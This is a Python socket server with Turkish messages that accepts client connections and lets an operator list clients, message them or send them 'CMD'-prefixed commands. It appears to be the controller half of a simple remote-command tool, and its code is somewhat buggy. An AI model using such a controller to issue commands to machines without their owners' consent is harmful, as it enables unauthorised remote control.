from msilib.schema import ControlEvent
import socket
import os
import asyncio
import threading
import time

HOST = "localhost"
PORT = 4445
Address = ((HOST,PORT))
ConnectedList = ["LIST"]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


s.bind(Address)
s.listen()
print("Arama baslatildi.")



def clientaccept():
    while True:
        c, addr= s.accept()
        connected = (c, addr)
        ConnectedList.append(connected)

def listPrint():
    if len(ConnectedList) == 1:
        return False
    else:
        for x in range(1,len(ConnectedList)):
            listCount = int(x)
            print(f"[{listCount}] {ConnectedList[listCount][1]}\n")


def checkClientsIsOnline():
        for clientID in range(1,len(ConnectedList)):
            client = ConnectedList[clientID][0]
            try:
                client.send(b"")
            except:
                ConnectedList.remove(ConnectedList[clientID])

async def menu():
    try:
        os.system("cls")
        choice = input(":  ")
        if choice == "list":
            if len(ConnectedList) > 1:
                listPrint()
                await asyncio.sleep(3)
            else:
                print("Liste bos!")
                await asyncio.sleep(3)
        elif choice == "msg":
            if len(ConnectedList) > 1:
                listPrint()
                addrChoice = input("Select address: ")
                messageText = input("Message:  ")
                c = ConnectedList[int(addrChoice)][0]
                c.send(messageText.encode("utf-8"))
                
            else:
                print("Liste Bos!")
                await asyncio.sleep(3)
        elif choice == "cmd":
            if len(ConnectedList) > 1:
                listPrint()
                addrChoice = input("Select address: ")
                messageText = input("Command:  ")
                c = ConnectedList[int(addrChoice)][0]
                c.send(f"CMD{messageText}".encode("utf-8"))
            else:
                print("Liste Bos!")
                await asyncio.sleep(3)
        else:
            print("Yanlis deger girdiniz!")
            time.sleep(2)
    except ConnectionResetError:
        print("Client kapatilmis.")
        time.sleep(2)


try:
    errorResult = False
    menuWarn = False
    clientWarn = False
    while True:
            t2 = threading.Thread(target=checkClientsIsOnline)
            t2.start()
            t = threading.Thread(target=clientaccept)
            t.start()
            if len(ConnectedList) > 1:
                if menuWarn == False:
                    os.system("cls")
                    print("Menuye geciliyor...")
                    time.sleep(2)
                    menuWarn = True
                loop = asyncio.new_event_loop()
                task = loop.create_task(menu())
                loop.run_until_complete(task)
            else:
                menuWarn = False
                os.system("cls")
                print("Client araniyor...")
                time.sleep(1)
            if errorResult == False:
                print("Aktif client yok!")
                errorResult = True
except Exception as e:
    print(f"\nHata veya sizin tarafinizdan cikis yapildi.\n{e}")
    exit()

